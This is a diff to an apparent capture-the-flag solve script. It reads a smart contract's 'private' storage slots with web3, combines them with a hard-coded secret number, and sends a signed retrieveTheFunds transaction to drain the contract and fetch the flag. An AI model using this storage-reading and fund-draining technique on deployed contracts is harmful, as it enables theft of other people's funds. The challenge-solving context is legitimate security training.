@@ -4,9 +4,11 @@ from Secret_and_Ephemeral.Util import init_challenge, get_flag
 from web3.middleware import geth_poa_middleware
 from web3.contract import Contract
 from Compile import compile_sol
-
+from web3_input_decoder import decode_constructor, decode_function
 
 # Contract owner is 0x7BCF8A237e5d8900445C148FC2b119670807575b
+# not_yours =  so anyways i just started blasting
+# secret = 233573869
 
 SCRIPT_PATH = "SecretAndEphemeral.sol"
 
@@ -25,15 +27,53 @@ compiled_sol = compile_sol(SCRIPT_PATH)
 bytecode = compiled_sol["contracts"]["SecretAndEphemeral.sol"]["SecretAndEphemeral"]["evm"]["bytecode"]["object"]
 abi = json.loads(compiled_sol["contracts"]["SecretAndEphemeral.sol"]["SecretAndEphemeral"]["metadata"])["output"]["abi"]
 
-contract = w3.eth.contract(contract_addr, abi=abi)
+contract = w3.eth.contract(address=contract_addr, abi=abi)
 
 
-for i in range(10):
-    transaction = w3.eth.getBlock(i)["transactions"]
-    if transaction:
-        for j in range(len(transaction)):
-            input_field = w3.eth.get_transaction(f"{transaction[j].hex()}")['input']
-            print(contract.decode_function_input(input_field))
+def get_not_yours():
+    index = w3.keccak(int(3).to_bytes(32, "big"))
+    index = int(index.hex(), 16)
+    part1 = (w3.toText(w3.eth.getStorageAt(contract_addr, index)))
+    part2 = (w3.toText(w3.eth.getStorageAt(contract_addr, index + 1)))[0:2]
+    secret = part1 + part2
+    return secret
 
 
-#print(w3.eth.getStorageAt(contract_addr,1))
+def call_contract_method(method_with_args):
+    nonce = w3.eth.get_transaction_count(player_addr)
+    tx = method_with_args.buildTransaction({
+        'chainId': 31337,
+        'nonce': nonce,
+        'from': player_addr,
+        'gasPrice': w3.eth.gas_price
+    })
+    gas = w3.eth.estimate_gas(tx)
+    tx['gas'] = gas
+    signed_tx = w3.eth.account.sign_transaction(tx, private_key=player_key)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    return tx_receipt
+
+
+# for i in range(10):
+#    transaction = w3.eth.getBlock(i)["transactions"]
+#    if transaction:
+#        for j in range(len(transaction)):
+#            t = w3.eth.get_transaction(f"{transaction[j].hex()}")
+#            print(t)
+
+def exploit():
+    contract_owner = "0x7BCF8A237e5d8900445C148FC2b119670807575b"
+    not_yours = get_not_yours()
+    secret_number = 233573869
+    retrieve_funds_func = contract.functions.retrieveTheFunds(not_yours, secret_number, contract_owner)
+    call_contract_method(retrieve_funds_func)
+    get_flag(SOLVE_URL)
+
+
+def main():
+    exploit()
+
+
+if __name__ == "__main__":
+    main()
